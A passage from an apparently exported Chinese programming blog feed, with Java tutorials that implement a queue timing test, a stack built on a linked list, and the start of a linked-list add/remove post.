class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> opCount = <span class="number">100000</span>;</span><br><span class="line"></span><br><span class="line">        LoopQueue&lt;Integer&gt; loopQueue = <span class="keyword">new</span> LoopQueue&lt;&gt;();</span><br><span class="line">        <span class="keyword">double</span> time1 = testQueue(loopQueue, opCount);</span><br><span class="line">        System.out.println(<span class="string">"LoopQueue , time: "</span> + time1 + <span class="string">"s"</span>);</span><br><span class="line">        ArrayQueue&lt;Integer&gt; arrayQueue = <span class="keyword">new</span> ArrayQueue&lt;&gt;();</span><br><span class="line">        <span class="keyword">double</span> time2 = testQueue(arrayQueue, opCount);</span><br><span class="line">        System.out.println(<span class="string">"arrayQueue , time: "</span> + time2 + <span class="string">"s"</span>);</span><br><span class="line">        LinkedListQueue&lt;Integer&gt; linkedListQueue = <span class="keyword">new</span> LinkedListQueue&lt;&gt;();</span><br><span class="line">        <span class="keyword">double</span> time3 = testQueue(linkedListQueue, opCount);</span><br><span class="line">        System.out.println(<span class="string">"LinkedListQueue , time: "</span> + time3 + <span class="string">"s"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>算法与数据结构</category>
      </categories>
      <tags>
        <tag>成长之路</tag>
        <tag>数据结构</tag>
        <tag>JAVA</tag>
        <tag>链表实现队列</tag>
      </tags>
  </entry>
  <entry>
    <title>【Java】数据结构-链表实现栈(完整代码)</title>
    <url>/2021/06/26/%E3%80%90Java%E3%80%91%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E9%93%BE%E8%A1%A8%E5%AE%9E%E7%8E%B0%E6%A0%88(%E5%AE%8C%E6%95%B4%E4%BB%A3%E7%A0%81)/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="我的个人博客"><a href="#我的个人博客" class="headerlink" title="我的个人博客"></a>我的个人博客</h1><blockquote>
<h2 id="孤桜懶契：http-gylq-github-io"><a href="#孤桜懶契：http-gylq-github-io" class="headerlink" title="孤桜懶契：http://gylq.github.io"></a>孤桜懶契：<a href="http://gylq.github.io" target="_blank" rel="noopener">http://gylq.github.io</a></h2></blockquote>
<h1 id="链表实现栈的接口"><a href="#链表实现栈的接口" class="headerlink" title="链表实现栈的接口"></a>链表实现栈的接口</h1><p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210626155905712.png" alt="image-20210626155905712"></p>
<h1 id="链表实现栈操作执行结果"><a href="#链表实现栈操作执行结果" class="headerlink" title="链表实现栈操作执行结果"></a>链表实现栈操作执行结果</h1><p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210626162121811.png" alt="image-20210626162121811"></p>
<h1 id="链表实现栈的完整代码"><a href="#链表实现栈的完整代码" class="headerlink" title="链表实现栈的完整代码"></a>链表实现栈的完整代码</h1><h2 id="Stack-java"><a href="#Stack-java" class="headerlink" title="Stack.java"></a>Stack.java</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Stack</span>&lt;<span class="title">E</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">getSize</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">boolean</span> <span class="title">isEmpty</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">push</span><span class="params">(E e)</span></span>;</span><br><span class="line">    <span class="function">E <span class="title">pop</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function">E <span class="title">peek</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="LinkedList-java-上一个发的文章实现链表的内容"><a href="#LinkedList-java-上一个发的文章实现链表的内容" class="headerlink" title="LinkedList.java(上一个发的文章实现链表的内容)"></a>LinkedList.java(上一个发的文章实现链表的内容)</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LinkedList</span>&lt;<span class="title">E</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="class"><span class="keyword">class</span> <span class="title">Node</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> E e;</span><br><span class="line">        <span class="keyword">public</span> Node next;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">Node</span><span class="params">(E e, Node next)</span></span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.e = e;</span><br><span class="line">            <span class="keyword">this</span>.next = next;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">Node</span><span class="params">(E e)</span></span>&#123;</span><br><span class="line">            <span class="keyword">this</span>(e, <span class="keyword">null</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">Node</span><span class="params">()</span></span>&#123;</span><br><span class="line">            <span class="keyword">this</span>(<span class="keyword">null</span>,<span class="keyword">null</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">            <span class="keyword">return</span> e.toString();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Node dummyHead;</span><br><span class="line">    <span class="keyword">int</span> size;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">LinkedList</span><span class="params">()</span></span>&#123;</span><br><span class="line">        dummyHead = <span class="keyword">new</span> Node(<span class="keyword">null</span>,<span class="keyword">null</span>);</span><br><span class="line">        size = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//  获取链表中的元素个数</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getSize</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> size;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 返回链表是否为空</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isEmpty</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> size == <span class="number">0</span> ;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在链表的index（0-based）位置添加新的元素e</span></span><br><span class="line">    <span class="comment">// 在链表中不是一个常用的操作，练习用：）</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> index, E e)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(index &lt; <span class="number">0</span> || index &gt; size)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Add failed. Illegal index."</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            Node prev = dummyHead;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; index ; i++) <span class="comment">//dummyHead是0前面的结点</span></span><br><span class="line">                prev = prev.next;</span><br><span class="line"><span class="comment">//            Node node = new Node(e);</span></span><br><span class="line"><span class="comment">//            node.next = prev.next;</span></span><br><span class="line"><span class="comment">//            prev.nxt = node;</span></span><br><span class="line"></span><br><span class="line">            prev.next = <span class="keyword">new</span> Node(e,prev.next);</span><br><span class="line">            size ++;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在链表头添加元素e</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addFirst</span><span class="params">(E e)</span></span>&#123;</span><br><span class="line">        add(<span class="number">0</span>, e);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在链表末尾添加新的元素e</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addLast</span><span class="params">(E e)</span></span>&#123;</span><br><span class="line">        add(size, e);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获得链表第index（0-based）个位置的元素</span></span><br><span class="line">    <span class="comment">// 在链表中不是一个常用的操作，练习用：）</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> E <span class="title">get</span><span class="params">(<span class="keyword">int</span> index)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(index &lt; <span class="number">0</span> || index &gt;= size)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Get failed. Illegal index."</span>);</span><br><span class="line"></span><br><span class="line">        Node cur = dummyHead.next;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; index ; i ++)</span><br><span class="line">            cur = cur.next;</span><br><span class="line">        <span class="keyword">return</span> cur.e;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获得链表的第一个元素</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> E <span class="title">getFirst</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> get(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获得链表的最后一个元素</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> E <span class="title">getLast</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> get(size - <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 修改链表的第index（0 - based）个位置的元素为e</span></span><br><span class="line">    <span class="comment">// 在链表中不是一个常用的操作，练习用</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">set</span><span class="params">(<span class="keyword">int</span> index, E e)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(index &lt; <span class="number">0</span> || index &gt;= size)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"set failed. Illegal index."</span>);</span><br><span class="line"></span><br><span class="line">        Node cur = dummyHead.next;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; index ; i ++)</span><br><span class="line">            cur = cur.next;</span><br><span class="line">        cur.e = e;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 查找链表中是否有元素e</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">contains</span><span class="params">(E e)</span></span>&#123;</span><br><span class="line">        Node cur = dummyHead.next;</span><br><span class="line">        <span class="keyword">while</span>(cur != <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(cur.e.equals(e))</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            cur = cur.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从链表中删除index（0-based）位置的元素，返回删除的元素</span></span><br><span class="line">    <span class="comment">// 在链表中不是一个常用的操作，练习用的</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> E <span class="title">remove</span><span class="params">(<span class="keyword">int</span> index)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(index &lt; <span class="number">0</span> || index &gt;= size)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Remove failed. Index is illegal."</span>);</span><br><span class="line"></span><br><span class="line">        Node prev = dummyHead;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; index; i++)</span><br><span class="line">            prev = prev.next;</span><br><span class="line"></span><br><span class="line">        Node retNode = prev.next;</span><br><span class="line">        prev.next = retNode.next;</span><br><span class="line">        retNode.next = <span class="keyword">null</span>;</span><br><span class="line">        size --;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> retNode.e;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从链表中删除第一个元素</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> E <span class="title">removeFirst</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> remove(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从链表中删除最后一个元素</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> E <span class="title">removeLast</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> remove(size - <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        StringBuilder res = <span class="keyword">new</span> StringBuilder();</span><br><span class="line"><span class="comment">//        Node cur = dummyHead.next;</span></span><br><span class="line"><span class="comment">//        while(cur != null)&#123;</span></span><br><span class="line"><span class="comment">//            res.append(cur + "-&gt;");</span></span><br><span class="line"><span class="comment">//            cur = cur.next;</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line">        <span class="keyword">for</span>(Node cur = dummyHead.next ; cur != <span class="keyword">null</span>; cur = cur.next)</span><br><span class="line">            res.append(cur + <span class="string">"-&gt;"</span>);</span><br><span class="line">        res.append(<span class="string">"Null"</span>);</span><br><span class="line">        <span class="keyword">return</span> res.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="LinkedListStack-java（链表实现栈代码）"><a href="#LinkedListStack-java（链表实现栈代码）" class="headerlink" title="LinkedListStack.java（链表实现栈代码）"></a>LinkedListStack.java（链表实现栈代码）</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LinkedListStack</span>&lt;<span class="title">E</span>&gt; <span class="keyword">implements</span> <span class="title">Stack</span>&lt;<span class="title">E</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> LinkedList&lt;E&gt; list;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">LinkedListStack</span><span class="params">()</span></span>&#123;</span><br><span class="line">        list = <span class="keyword">new</span> LinkedList&lt;&gt;();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getSize</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> list.getSize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isEmpty</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> list.isEmpty();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">push</span><span class="params">(E e)</span></span>&#123;</span><br><span class="line">        list.addFirst(e);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> E <span class="title">pop</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> list.removeFirst();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> E <span class="title">peek</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> list.getFirst();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        StringBuilder res = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        res.append(<span class="string">"Stack: top "</span>);</span><br><span class="line">        res.append(list);</span><br><span class="line">        <span class="keyword">return</span> res.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        LinkedListStack&lt;Integer&gt; stack = <span class="keyword">new</span> LinkedListStack&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; <span class="number">5</span> ; i++)&#123;</span><br><span class="line">            stack.push(i);</span><br><span class="line">            System.out.println(stack);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        stack.pop();</span><br><span class="line">        System.out.println(stack);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h1 id="我对比了一下动态数组栈和链表栈的时间输出结果截图"><a href="#我对比了一下动态数组栈和链表栈的时间输出结果截图" class="headerlink" title="我对比了一下动态数组栈和链表栈的时间输出结果截图"></a>我对比了一下动态数组栈和链表栈的时间输出结果截图</h1><blockquote>
<ul>
<li><h2 id="链表的操作中包含更多的new操作，在数值大的时候，会比动态数组的栈速度慢个1-x倍"><a href="#链表的操作中包含更多的new操作，在数值大的时候，会比动态数组的栈速度慢个1-x倍" class="headerlink" title="链表的操作中包含更多的new操作，在数值大的时候，会比动态数组的栈速度慢个1.x倍"></a>链表的操作中包含更多的new操作，在数值大的时候，会比动态数组的栈速度慢个1.x倍</h2></li>
</ul>
</blockquote>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210626162529124.png" alt="image-20210626162529124"></p>
<h1 id="测试时间代码"><a href="#测试时间代码" class="headerlink" title="测试时间代码"></a>测试时间代码</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 测试使用stack运行opCount个push和pop操作所需要的时间，单位：秒</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">double</span> <span class="title">testStack</span><span class="params">(Stack&lt;Integer&gt; stack, <span class="keyword">int</span> opCount)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">long</span> startTime = System.nanoTime();</span><br><span class="line"></span><br><span class="line">    Random random = <span class="keyword">new</span> Random();</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; opCount; i ++)</span><br><span class="line">        stack.push(random.nextInt(Integer.MAX_VALUE));</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; opCount; i ++)</span><br><span class="line">        stack.pop();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">long</span> endTime = System.nanoTime();</span><br><span class="line">    <span class="keyword">return</span> (endTime - startTime) / <span class="number">1000000000.0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>算法与数据结构</category>
      </categories>
      <tags>
        <tag>成长之路</tag>
        <tag>数据结构</tag>
        <tag>JAVA</tag>
        <tag>插入排序</tag>
      </tags>
  </entry>
  <entry>
    <title>【Java】数据结构-链表的增删改查(完整代码)</title>
    <url>/2021/06/26/%E3%80%90Java%E3%80%91%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E9%93%BE%E8%A1%A8%E7%9A%84%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5(%E5%AE%8C%E6%95%B4%E4%BB%A3%E7%A0%81)/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="我的个人博客"><a href="#我的个人博客" class="headerlink" title="我的个人博客"></a>我的个人博客</h1><blockquote>
<h2 id="孤桜懶契：http-gylq-github-io"><a href="#孤桜懶契：http-gylq-github-io" class="headerlink" title="孤桜懶契：http://gylq.github.io"></a>孤桜懶契：<a href="http://gylq.github.io" target="_blank" rel="noopener">http://gylq.github.io</a></h2></blockquote>
<h1 id="简单添加元素链表代码-LinkedList"><a href="#简单添加元素链表代码-LinkedList" class="headerlink" title="简单添加元素链表代码 LinkedList"></a>简单添加元素链表代码 LinkedList</h1><h2 id="LinkedList-java"><a href="#LinkedList-java" class="headerlink" title="LinkedList.java"></a>LinkedList.java</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LinkedList</span>&lt;<span class="title">E</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="class"><span class="keyword">class</span> <span class="title">Node</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> E e;</span><br><span class="line">        <span class="keyword">public</span> Node next;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">Node</span><span class="params">(E e, Node next)</span></span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.e = e;</span><br><span class="line">            <span class="keyword">this</span>.next = next;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">Node</span><span class="params">(E e)</span></span>&#123;</span><br><span class="line">            <span class="keyword">this</span>(e, <span class="keyword">null</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">Node</span><span class="params">()</span></span>&#123;</span><br><span class="line">            <span class="keyword">this</span>(<span class="keyword">null</span>,<span class="keyword">null</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">            <span class="keyword">return</span> e.toString();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Node head;</span><br><span class="line">    <span class="keyword">int</span> size;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">LinkedList</span><span class="params">()</span></span>&#123;</span><br><span class="line">        head = <span class="keyword">null</span>;</span><br><span class="line">        size = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//  获取链表中的元素个数</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getSize</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> size;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 返回链表是否为空</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isEmpty</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> size == <span class="number">0</span> ;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在链表头添加元素e</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addFirst</span><span class="params">(E e)</span></span>&#123;</span><br><span class="line"><span class="comment">//        Node  node = new Node(e);</span></span><br><span class="line"><span class="comment">//        node.next = head;</span></span><br><span class="line"><span class="comment">//        head = node;</span></span><br><span class="line"></span><br><span class="line">        head = <span class="keyword">new</span> Node(e, head);</span><br><span class="line">        size ++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在链表的index（0-based）位置添加新的元素e</span></span><br><span class="line">    <span class="comment">// 在链表中不是一个常用的操作，练习用：）</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> index, E e)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(index &lt; <span class="number">0</span> || index &gt; size)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Add failed. Illegal index."</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(index == <span class="number">0</span>)&#123;</span><br><span class="line"><span class="comment">//            Node node = new Node(e);</span></span><br><span class="line"><span class="comment">//            head = node.next;</span></span><br><span class="line"><span class="comment">//            head = node;</span></span><br><span class="line"><span class="comment">//            size ++;</span></span><br><span class="line">            addFirst(e);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            Node prev = head;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; index - <span class="number">1</span>; i++)</span><br><span class="line">                prev = prev.next;</span><br><span class="line"><span class="comment">//            Node node = new Node(e);</span></span><br><span class="line"><span class="comment">//            node.next = prev.next;</span></span><br><span class="line"><span class="comment">//            prev.nxt = node;</span></span><br><span class="line"></span><br><span class="line">            prev.next = <span class="keyword">new</span> Node(e,prev.next);</span><br><span class="line">            size ++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在链表末尾添加新的元素e</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addLast</span><span class="params">(E e)</span></span>&#123;</span><br><span class="line">        add(size, e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h1 id="优化插入链表引入虚拟头结点dummyHead代码"><a href="#优化插入链表引入虚拟头结点dummyHead代码" class="headerlink" title="优化插入链表引入虚拟头结点dummyHead代码"></a>优化插入链表引入虚拟头结点dummyHead代码</h1><p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210626145850280.png" alt="image-20210626145850280"></p>
<h2 id="LinkedList-java-1"><a href="#LinkedList-java-1" class="headerlink" title="LinkedList.java"></a>LinkedList.java</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LinkedList</span>&lt;<span class="title">E</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="class"><span class="keyword">class</span> <span class="title">Node</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> E e;</span><br><span class="line">        <span class="keyword">public</span> Node next;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">Node</span><span class="params">(E e, Node next)</span></span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.e = e;</span><br><span class="line">            <span class="keyword">this</span>.next = next;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">Node</span><span class="params">(E e)</span></span>&#123;</span><br><span class="line">            <span class="keyword">this</span>(e, <span class="keyword">null</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">Node</span><span class="params">()</span></span>&#123;</span><br><span class="line">            <span class="keyword">this</span>(<span class="keyword">null</span>,<span class="keyword">null</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">            <span class="keyword">return</span> e.toString();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Node dummyHead;</span><br><span class="line">    <span class="keyword">int</span> size;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">LinkedList</span><span class="params">()</span></span>&#123;</span><br><span class="line">        dummyHead = <span class="keyword">new</span> Node(<span class="keyword">null</span>,<span class="keyword">null</span>);</span><br><span class="line">        size = <span class="number">0</span>;</span><br><span 